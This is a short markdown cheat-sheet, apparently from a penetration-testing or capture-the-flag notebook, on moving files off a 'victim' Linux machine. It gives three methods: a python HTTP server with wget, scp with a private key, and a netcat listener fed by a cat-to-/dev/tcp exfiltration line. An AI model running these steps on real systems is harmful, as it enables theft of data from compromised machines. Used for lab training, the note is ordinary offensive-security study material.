---
title: Share files in Linux 🍉
---
>[!Info]
>This note aims to help sharing files from victim machine to host machine.

### Way 1: Via python server:

```shell
# In victim's machine
python3 -m http.server PORT

# In your machine
wget http://MACHINE_IP:PORT/file
```

### Way 2: Via SCP

You must run this command *in your machine* and you'll need credentials or ssh keys:

```shell
#by private key
scp -i id_rsa USER@IP_HOST:/PATH/TO/THE/FILE /DESTINATION/PATH
#by port
scp -P PORT USER@IP_HOST:/PATH/TO/THE/FILE /DESTINATION/PATH
```

## Way 3: Via Netcat

```shell
# In your machine start a nc listener to receive the file
nc -lnvp YOUR_PORT > FILE_NAME
 
# Then in the victim's machine
cat /path/to/FILE_NAME > /dev/tcp/YOUR_IP/YOUR_PORT
```

